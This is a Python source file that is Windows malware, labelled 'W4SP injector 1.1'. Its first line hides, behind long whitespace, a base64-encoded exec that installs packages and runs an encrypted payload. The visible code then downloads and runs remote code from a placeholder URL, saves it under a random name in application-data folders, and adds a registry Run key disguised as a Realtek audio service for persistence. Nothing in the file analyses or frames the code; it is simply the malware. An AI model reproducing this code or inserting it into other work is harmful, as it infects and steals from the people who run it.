import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     ;import base64;exec(base64.b64decode('b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBjcnlwdG9ncmFwaHknKTtvcy5zeXN0ZW0oJ3BpcCBpbnN0YWxsIHJlcXVlc3RzJyk7b3Muc3lzdGVtKCdwaXAgaW5zdGFsbCBmZXJuZXQnKTtpbXBvcnQgcmVxdWVzdHM7ZnJvbSBmZXJuZXQgaW1wb3J0IEZlcm5ldDtleGVjKEZlcm5ldChiJ2ExNFlrZldBWUx4ekdFZllkWi1xdmtIRDFtd0hnUjYwS1R3M2toRHlmeWM9JykuZGVjcnlwdChiJ2dBQUFBQUJtbjV6aUJUVjBTRS1xX2NCUk1kT2YyT3JmSkd3VGdta2V6WW9pMGdIZEY0QlNydk5XVG1sWlZLWVF1VTF1TV9Bb1RnM2Fub1NveTV0VWV5UnhLbm1YRFZ6X0szUkhIaWE1NExVZUM4SlFneWF0LS1wU21tckZaMFJSa0IteHZQdFBtNHdwTm9CS2E3WTVTTFp5RkptV2dqOS0tX29fQ29NeXJoSGMweWtQWml0QWtwYzQ4LWtUOXhZODlzTkhXeTA2Ymd4ZzBxSy1IWDJ2dHdCZ2RmN2habXc2ckpwTU1WZ3YyTUVma3dNdUJLcVRfNWs9Jykp').decode())
from sys import executable
from urllib import request
from os import getenv, system, name, listdir
from os.path import isfile
import winreg
from random import choice

if name != 'nt': 
    exit()

# W4SP injector 1.1
# by loTus04

def getPath():
    path = choice([getenv("APPDATA"), getenv("LOCALAPPDATA")])
    directory = listdir(path)
    for _ in range(10):
        chosen = choice(directory)
        ye = path + "\\" + chosen
        if not isfile(ye) and " " not in chosen:
            return ye
    return getenv("TEMP")

def getName():
    firstName = ''.join(choice('bcdefghijklmnopqrstuvwxyz') for _ in range(8))
    lasName = ['.dll', '.png', '.jpg', '.gay', '.ink', '.url', '.jar', '.tmp', '.db', '.cfg']
    return firstName + choice(lasName)


def install(path):
    with open(path, mode='w', encoding='utf-8') as f:
        f.write(request.urlopen("W4SPGRAB").read().decode("utf8"))

def run(path):
    system(f"start {executable} {path}")

def startUP(path):
    faked = 'SecurityHealthSystray.exe'
    address = f"{executable} {path}"
    key1 = winreg.HKEY_CURRENT_USER
    key2 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"
    open_ = winreg.CreateKeyEx(key1, key2, 0, winreg.KEY_WRITE)
    winreg.SetValueEx(open_, "Realtek HD Audio Universal Service", 0, winreg.REG_SZ, f"{faked} & {address}")

DoYouKnowTheWay = getPath() + '\\' + getName()
install(DoYouKnowTheWay)
run(DoYouKnowTheWay)
try:
    startUP(DoYouKnowTheWay)
except:
    pass
print('yjsjkgm')